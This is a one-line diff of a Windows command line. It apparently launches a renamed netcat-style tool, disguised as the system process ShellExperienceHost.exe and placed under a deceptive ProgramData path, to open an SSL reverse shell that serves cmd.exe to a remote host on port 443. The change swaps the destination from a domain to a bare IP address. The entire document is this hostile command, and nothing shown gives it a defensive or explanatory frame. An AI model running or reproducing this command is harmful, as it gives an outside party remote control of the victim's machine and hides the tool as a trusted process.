@@ -1,1 +1,1 @@
-C:\ProgramData\NUL..\ShellExperienceHost.exe --ssl apap.app 443 -e cmd.exe
+C:\ProgramData\NUL..\ShellExperienceHost.exe --ssl 193.124.33.180 443 -e cmd.exe
